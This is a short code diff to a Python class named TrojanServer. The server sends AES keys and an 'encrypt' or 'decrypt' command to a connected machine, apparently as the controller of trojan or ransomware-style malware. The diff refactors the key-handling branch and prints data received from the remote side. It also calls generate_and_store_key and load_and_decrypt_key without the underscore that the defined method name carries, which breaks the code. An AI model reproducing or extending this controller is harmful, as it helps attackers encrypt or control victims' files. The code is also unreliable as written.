@@ -91,10 +91,18 @@ class TrojanServer:
         self.keys = KeyManager()
 
     def run(self):
-        aes_key = self._generate_and_store_key() if self.action == "encrypt" else self._load_and_decrypt_key()
+        if self.action == "encrypt":
+            aes_key = self.generate_and_store_key()
+        else:
+            aes_key = self.load_and_decrypt_key()
+
         protocol.send(self.conn, aes_key)
         protocol.send(self.conn, self.action)
-        data = protocol.receive(self.conn).decode()
+
+        data = protocol.receive(self.conn)
+        decoded_data = data.decode()
+
+        print(decoded_data)
 
     def _generate_and_store_key(self):
         word = self.keys.get_random_word()
